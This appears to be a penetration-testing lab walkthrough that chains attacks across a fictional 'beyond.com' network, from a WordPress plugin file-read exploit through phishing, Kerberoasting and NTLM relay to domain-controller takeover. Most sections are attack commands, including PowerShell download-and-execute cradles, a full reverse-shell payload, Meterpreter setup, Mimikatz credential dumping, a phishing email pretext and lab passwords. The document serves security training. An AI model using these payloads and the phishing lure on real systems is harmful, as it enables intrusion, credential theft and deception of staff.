# Assembling the Pieces - Cheat Sheet & Walkthrough

## Table of Contents
1. [Enumeration Phase](#1-enumeration-phase)
2. [Gaining Initial Foothold](#2-gaining-initial-foothold)
3. [Privilege Escalation & Information Discovery](#3-privilege-escalation--information-discovery)
4. [Gaining Internal Network Access](#4-gaining-internal-network-access)
5. [Internal Network Enumeration](#5-internal-network-enumeration)
6. [Attacking Internal Web Application](#6-attacking-internal-web-application)
7. [Domain Controller Access](#7-domain-controller-access)
8. [Key Takeaways](#8-key-takeaways)

---

## 1. Enumeration Phase

### 1.1 Workspace Setup
```bash
mkdir ~/beyond
cd ~/beyond
mkdir mailsrv1 websrv1
touch creds.txt computer.txt
```

### 1.2 MAILSRV1 Enumeration

#### Nmap Scan
```bash
sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
```

**Findings**:
- **Port 25**: hMailServer (SMTP)
- **Port 80**: IIS web server (default page)
- **Port 110**: POP3 (hMailServer)
- **Port 135**: MSRPC
- **Port 139/445**: NetBIOS/SMB
- **Port 143**: IMAP (hMailServer)
- **Port 587**: SMTP (hMailServer)

#### Web Enumeration
```bash
# Directory enumeration (no results)
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -x txt,pdf,config
```

### 1.3 WEBSRV1 Enumeration

#### Nmap Scan
```bash
sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
```

**Findings**:
- **Port 22**: OpenSSH 8.9p1 (Ubuntu 22.04)
- **Port 80**: Apache 2.4.52 (WordPress 6.0.2)

#### WordPress Enumeration
```bash
whatweb http://192.168.50.244

wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
```

**Plugins Found**:
- akismet (version unknown)
- classic-editor (up to date)
- contact-form-7 (up to date)
- **duplicator 1.3.26** (outdated - vulnerable)
- elementor (up to date)
- wordpress-seo (up to date)

#### Search for Exploits
```bash
searchsploit duplicator
# Found: WordPress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (50420)
```

---

## 2. Gaining Initial Foothold

### 2.1 Exploit Duplicator Plugin

```bash
# Copy exploit
searchsploit -m 50420
cd websrv1

# Read /etc/passwd
python3 50420.py http://192.168.50.244 /etc/passwd
# Found users: daniela, marcus
```

### 2.2 Retrieve SSH Private Key

```bash
# Get daniela's SSH key
python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa

# Save as id_rsa and fix permissions
chmod 600 id_rsa

# Crack passphrase
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
# Passphrase: tequieromucho

# SSH into WEBSRV1
ssh -i id_rsa daniela@192.168.50.244
# Password: tequieromucho
```

### 2.3 Save Credentials
```bash
echo "daniela:tequieromucho (SSH private key passphrase)" >> creds.txt
```

---

## 3. Privilege Escalation & Information Discovery

### 3.1 Run linPEAS

```bash
# On Kali
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80

# On WEBSRV1
wget http://192.168.119.5/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Key Findings**:
- **Sudo command**: `(ALL) NOPASSWD: /usr/bin/git`
- **WordPress DB password**: `DanielKeyboard3311`
- **Git repository**: `/srv/www/wordpress/.git`

### 3.2 Exploit sudo git

```bash
# Method 1 (failed due to env restrictions)
sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help

# Method 2 (successful)
sudo git -p help config
# Inside less pager: !/bin/bash
# Now root!
```

### 3.3 Examine Git Repository

```bash
cd /srv/www/wordpress
git status
git log
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
```

**Found**: `sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/`

### 3.4 Update Credentials
```bash
echo "wordpress:DanielKeyboard3311 (WordPress database)" >> creds.txt
echo "john:dqsTwTpZPn#nL (fetch_current.sh)" >> creds.txt
```

---

## 4. Gaining Internal Network Access

### 4.1 Validate Credentials

```bash
# Create username/password lists
echo -e "marcus\njohn\ndaniela" > usernames.txt
echo -e "tequieromucho\nDanielKeyboard3311\ndqsTwTpZPn#nL" > passwords.txt

# Check against MAILSRV1
crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
# Found: john:dqsTwTpZPn#nL
```

### 4.2 Check SMB Shares
```bash
crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
# No actionable shares
```

### 4.3 Setup Phishing Attack

**Start Services**:
```bash
# WebDAV server
mkdir webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/

# Python HTTP server (PowerCat)
python3 -m http.server 8000

# Netcat listener
nc -nvlp 4444
```

**Create Windows Library File** (`config.Library-ms`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

**Create Shortcut**:
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

**Send Email**:
```bash
cat > body.txt << EOF
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
EOF

swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
# Username: john, Password: dqsTwTpZPn#nL
```

### 4.4 Reverse Shell Received
```powershell
whoami  # beyond\marcus
hostname # CLIENTWK1
ipconfig # 172.16.6.243
```

---

## 5. Internal Network Enumeration

### 5.1 Local Enumeration (CLIENTWK1)

```powershell
# Download winPEAS
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# Check OS
systeminfo
# Windows 11 Pro

# DNS cache reveals:
# dcsrv1.beyond.com (172.16.6.240)
# mailsrv1.beyond.com (172.16.6.254)
```

### 5.2 BloodHound Enumeration

```powershell
# Download SharpHound
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

**Custom BloodHound Queries**:

```cypher
// All computers
MATCH (m:Computer) RETURN m

// All users
MATCH (m:User) RETURN m

// Active sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

**Findings**:
- **Computers**: DCSRV1, INTERNALSRV1, MAILSRV1, CLIENTWK1
- **Users**: BECCY, JOHN, DANIELA, MARCUS
- **Domain Admins**: Administrator, BECCY
- **beccy** has session on MAILSRV1

### 5.3 Setup SOCKS Proxy

```bash
# Generate Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe

# Start listener
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.119.5
set LPORT 443
set ExitOnSession false
run -j

# On CLIENTWK1
iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
.\met.exe

# In Metasploit
use multi/manage/autoroute
set session 1
run

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

### 5.4 Network Enumeration via SOCKS

```bash
# Configure proxychains
cat /etc/proxychains4.conf
# socks5 127.0.0.1 1080

# SMB enumeration
proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares

# Port scan
sudo proxychains -q nmap -sT -Pn -p 21,80,443 172.16.6.240 172.16.6.241 172.16.6.254
# INTERNALSRV1: 80,443
# MAILSRV1: 80
```

### 5.5 Access Internal Web Server (Chisel)

```bash
# Kali (server)
./chisel server -p 8080 --reverse

# On CLIENTWK1
chisel.exe client 192.168.119.5:8080 R:80:172.16.6.241:80

# Add to /etc/hosts
echo "127.0.0.1 internalsrv1.beyond.com" >> /etc/hosts
```

---

## 6. Attacking Internal Web Application

### 6.1 Kerberoasting

```bash
# Get daniela's TGS hash
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
# Password: dqsTwTpZPn#nL

# Crack hash
hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
# Password: DANIelaRO123
```

### 6.2 WordPress Access
- Login to `http://internalsrv1.beyond.com/wordpress/wp-admin`
- Username: daniela
- Password: DANIelaRO123

### 6.3 Relay Attack Setup

```bash
# Start ntlmrelayx
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQBlAG4AdAA..."
```

**PowerShell Reverse Shell Payload** (base64 encoded):
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.5",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Start Netcat Listener**:
```bash
nc -nvlp 9999
```

**Modify WordPress Plugin**:
- Settings → Backup Migration
- Backup directory path: `//192.168.119.5/test`
- Click Save

### 6.4 Reverse Shell Received
```
whoami  # nt authority\system
hostname # MAILSRV1
```

---

## 7. Domain Controller Access

### 7.1 Get beccy's Hash

```bash
# On MAILSRV1
iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
.\met.exe

# In Metasploit - new session
sessions -i 2
shell
powershell
iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**Findings**:
```
User: beccy
Domain: BEYOND
NTLM: f0397ec5af49971f6efbdb07877046b3
Password: NiftyTopekaDevolve6655!#!
```

### 7.2 Access Domain Controller

```bash
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240

# Now on DCSRV1
whoami  # nt authority\system
hostname # DCSRV1
ipconfig # 172.16.6.240
```

---

## 8. Key Takeaways

### Critical Lessons

| Lesson | Description |
|--------|-------------|
| **Thorough Enumeration** | Never skip or cut short enumeration - you can't attack what you missed |
| **Document Everything** | Detailed notes are essential for combining information across machines |
| **Cyclical Process** | New access = new enumeration opportunities |
| **Multiple Vectors** | Have backup plans; Kerberoasting → WordPress → Relay → DCSync |
| **Post-Exploitation** | Run enumeration again with elevated privileges |

### Attack Chain Summary

```
WEBSRV1 (Apache/WordPress)
    ↓ Duplicator Plugin (CVE-2020-11738)
    ↓ SSH Private Key (daniela)
    ↓ sudo git → root
    ↓ Git History → john credentials
    ↓
MAILSRV1 (hMailServer)
    ↓ Phishing via john's email
    ↓ Reverse Shell (marcus)
    ↓ BloodHound Enumeration
    ↓ Kerberoasting → daniela password
    ↓
INTERNALSRV1 (WordPress)
    ↓ Backup Migration Plugin → SMB Relay
    ↓
MAILSRV1 (System)
    ↓ DCSync via Mimikatz → beccy hash
    ↓
DCSRV1 (Domain Controller) ✅
```

### Credentials Found

| Username | Password/Passphrase | Found At |
|----------|---------------------|----------|
| daniela | tequieromucho | SSH key passphrase |
| wordpress | DanielKeyboard3311 | WordPress DB |
| john | dqsTwTpZPn#nL | Git history |
| daniela | DANIelaRO123 | Kerberoasting |
| beccy | NiftyTopekaDevolve6655!#! | Mimikatz |

### Tools Used

| Tool         | Purpose                      |
| ------------ | ---------------------------- |
| Nmap         | Port scanning                |
| WPScan       | WordPress enumeration        |
| SearchSploit | Exploit discovery            |
| linPEAS      | Linux privilege escalation   |
| CrackMapExec | Credential validation        |
| swaks        | Email sending                |
| BloodHound   | AD enumeration               |
| Chisel       | HTTP tunneling               |
| impacket     | Kerberoasting, relay, psexec |
| Mimikatz     | Credential extraction        |